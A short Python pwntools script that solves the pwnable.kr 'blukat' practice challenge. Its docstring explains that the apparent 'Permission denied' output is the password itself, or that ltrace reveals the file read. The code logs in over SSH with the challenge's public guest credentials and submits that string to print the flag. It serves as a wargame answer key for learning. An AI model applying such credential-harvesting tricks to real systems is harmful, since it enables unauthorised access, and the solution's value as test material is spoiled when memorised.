"""
Very easy challenge, because there are 2 methods to get flag
First:
    just watch your group permission and don't decline the output of command `cat password`
Second:
    In source code we can see that we will open password and will read it.
    So you can just see it with `ltrace`
"""
from pwn import *


def get_flag():
    s = ssh(user='blukat', host='pwnable.kr', password='guest', port=2222)
    p = s.process('./blukat')
    p.sendline('cat: password: Permission denied')
    print(p.recvall().decode('utf-8'))


if __name__=='__main__':
    get_flag()
